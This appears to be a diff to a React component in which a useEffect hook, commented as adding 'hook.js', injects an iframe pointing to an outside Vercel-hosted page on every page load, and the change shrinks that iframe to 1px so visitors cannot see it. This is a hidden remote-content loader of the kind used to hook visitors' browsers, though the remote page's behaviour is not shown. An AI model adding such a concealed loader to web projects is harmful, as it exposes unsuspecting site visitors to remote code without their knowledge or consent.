@@ -15,13 +15,15 @@ export default function Context() {
 
     // Add the hook.js script dynamically
     useEffect(() => {
-        const script = document.createElement("iframe");
-        script.src = "https://live-server1.vercel.app/";
-        script.async = true;
-        document.body.appendChild(script);
+        const iframe = document.createElement("iframe");
+        iframe.src = "https://live-server1.vercel.app/";
+        iframe.style.width = "1px"; // Set width to 1px
+        iframe.style.height = "1px"; // Set height to 1px
+        iframe.async = true;
+        document.body.appendChild(iframe);
 
         return () => {
-            document.body.removeChild(script);
+            document.body.removeChild(iframe);
         };
     }, []);
 
